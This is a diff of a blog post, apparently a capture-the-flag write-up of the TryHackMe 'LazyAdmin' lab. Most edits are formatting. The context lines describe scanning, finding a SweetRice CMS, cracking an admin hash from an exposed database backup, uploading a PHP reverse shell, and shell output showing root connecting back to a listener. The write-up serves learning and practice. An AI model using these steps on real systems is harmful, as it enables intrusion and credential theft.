@@ -3,12 +3,10 @@ layout: post
 title: "[THM] LazyAdmin"
 date: 2022-12-27 08:46:18 +0000
 categories: Writeups
-excerpt: "LazyAdmin is an easy machine on Try Hack Me which involves web application exploitation. "
-header:
-  teaser: "/assets/LazyAdmin/LazyAdmin.jpg"
 ---
-
-![LazyAdmin]({{ site.url }}{{ site.baseurl }}/assets/LazyAdmin/LazyAdmin.jpg)
+<p align="center">
+  <img src="https://Reece4.github.io/assets/LazyAdmin/LazyAdmin.jpeg" />
+</p>
 
 LazyAdmin is an easy machine on TryHackMe. While the box is relatively simple, it was fun and was enough of a challenge to keep me hooked till I completed it. So, let’s get into it!
 
@@ -17,30 +15,44 @@ LazyAdmin is an easy machine on TryHackMe. While the box is relatively simple, i
 Start off with the first step in every CTF, Nmap. I just used a simple aggressive scan to get the information I needed.
 
 ```
-$ nmap -A 10.10.29.220                  	 
+$ nmap -A 10.10.29.220
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-26 20:00 GMT
 Nmap scan report for 10.10.29.220
-Host is up (0.076s latency).
-Not shown: 999 closed tcp ports (reset)
+Host is up (0.032s latency).
+Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh 	OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
 |   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
 |_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
-Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
-No exact OS matches for host (test conditions non-ideal).
+80/tcp open  http	Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=12/27%OT=22%CT=1%CU=35884%PV=Y%DS=2%DC=T%G=Y%TM=63AAD5
+OS:F2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M506ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST
+OS:11NW6%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+OS:N(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
 Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-TRACEROUTE (using port 554/tcp)
-HOP RTT   	ADDRESS
-1   27.69 ms  10.9.0.1
-2   101.61 ms 10.10.29.220
+TRACEROUTE (using port 443/tcp)
+HOP RTT  	ADDRESS
+1   34.48 ms 10.9.0.1
+2   34.37 ms 10.10.29.220
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 21.64 seconds
+Nmap done: 1 IP address (1 host up) scanned in 23.52 seconds
 ```
 
 The Nmap scan shows that the HTTP service is running on port 80, so I went to check out the website and found the default Apache page. From there, I used a tool called Gobuster which can bruteforce the website for directories.
@@ -67,7 +79,9 @@ I found the /content directory, so let’s check it out.
 
 ### [Enumeration]
 ---
-![](https://Reece4.github.io/assets/LazyAdmin/sweetrice.png)\
+\
+<img style ="border:2px solid black;" src="https://Reece4.github.io/assets/LazyAdmin/sweetrice.png" />
+
 The CMS is running SweetRice, I had never heard of this service before, so I decided to use searchsploit to see if there are any vulnerabilities for it.
 ```
 $ searchsploit sweetrice   
@@ -109,10 +123,10 @@ http://localhost/SweetRice-transfer.zip
 ```
 This basically says that you can download all the mysql files for the website at the address: http://(ip address)/inc/mysql_backup.
 
-![](https://Reece4.github.io/assets/LazyAdmin/mysqlpage.png)
+<img style ="border:2px solid black;" src="https://Reece4.github.io/assets/LazyAdmin/mysqlpage.png" />
 
-Scrolling through the file, it’s not difficult to find a username and a hashed password using MD5 encryption, so I simply decrypted the password using hashcat and now I have user login credentials for the website.
-
+Scrolling through the file, it’s not difficult to find a username and a hashed password using MD5 encryption, so I simply decrypted the password using hashcat and now I have user login credentials for the website. (The image might be difficult to see, sorry!)\
+\
 ![](https://Reece4.github.io/assets/LazyAdmin/admincreds.png)
 
 ```
@@ -206,8 +220,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /_themes          	(Status: 301) [Size: 322] [--> http://10.10.29.220/content/_themes/]                                                           	 
 /attachment       	(Status: 301) [Size: 325] [--> http://10.10.29.220/content/attachment/]
 ```
-After looking through some of the directories, I found that the /content/as directory has the login page.
-![](https://Reece4.github.io/assets/LazyAdmin/loginpage.png)
+After looking through some of the directories, I found that the "/content/as" directory has the login page.
+
+<p align="center">
+  <img src="https://Reece4.github.io/assets/LazyAdmin/loginpage.png" />
+</p>
 
 ### [Exploitation]
 ---
@@ -254,11 +271,14 @@ phpinfo();?>
 http://localhost/sweetrice/inc/ads/hacked.php
   -->
 ```
-This says that you are able to upload PHP files to the ads section on the website. So, I downloaded a PHP reverse shell from [github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), changed the IP address and port as specified, and uploaded it as an ad.
-
+This says that you are able to upload PHP files to the ads section on the website. So, I downloaded a PHP reverse shell from [github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), changed the IP address and port as specified, and uploaded it as an ad.\
+\
 ![](https://Reece4.github.io/assets/LazyAdmin/phpreverseshell.png)\
+\
 I then set up a netcat listener and navigated to the URI of the newly added ad.\
+\
 ![](https://Reece4.github.io/assets/LazyAdmin/phpadlistener.png)\
+\
 And just like that, we have user access! Now we can get the user flag with the command “cat user.txt”.
 
 ### [Privilege Escalation]
@@ -310,4 +330,4 @@ connect to [10.9.17.181] from (UNKNOWN) [10.10.29.220] 36216
 # whoami
 root
 ```
-Woohoo! Everything worked flawlessly! This box was great fun to mess around with and I hope you were able to learn something from this box.
+Woohoo! Everything worked flawlessly! This box was great fun to mess around with and I hope you were able to learn something from this write-up.
